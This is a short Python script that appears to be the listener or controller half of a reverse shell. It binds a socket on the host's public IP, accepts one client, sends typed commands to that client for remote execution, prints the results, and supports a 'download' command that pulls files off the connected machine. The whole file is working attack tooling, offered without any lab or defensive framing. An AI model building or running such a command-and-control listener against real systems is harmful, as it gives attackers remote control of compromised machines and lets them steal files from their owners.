import socket

import colorama
from requests import get

# Initialize Colorama module
colorama.init()

# Initial variables for listening host/port
# # Get the public ipv4 address of the server host
LHOST = get('https://api.ipify.org').text
LPORT = 64444

# Initializing socket module and starting server on listening host/port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((LHOST, LPORT))
# Only accept one incoming connection at a time
sock.listen(1)
print("Listening on port", LPORT)
# Accept client connections and get IPv4 address & port in addr tuple
client, addr = sock.accept()

# A "while True" loop is a loop that will run forever
while True:
    input_header = client.recv(1024)
    command = input(input_header.decode()).encode()

    # The only pre-defined command on the server is download
    if command.decode("utf-8").split(" ")[0] == "download":
        file_name = command.decode("utf-8").split(" ")[1][::-1]
        client.send(command)
        with open(file_name, "wb") as f:
            read_data = client.recv(1024)
            while read_data:
                f.write(read_data)
                read_data = client.recv(1024)
                if read_data == b"DONE":
                    break

    # If no command is entered, the user is reminded that data must be entered
    if command is b"":
        print("Please enter a command")
    # Otherwise, we'll send the command -- unless it's `exit`
    else:
        client.send(command)
        data = client.recv(1024).decode("utf-8")
        if data == "exit":
            print("Terminating connection", addr[0])
            break
        print(data)

client.close()
sock.close()
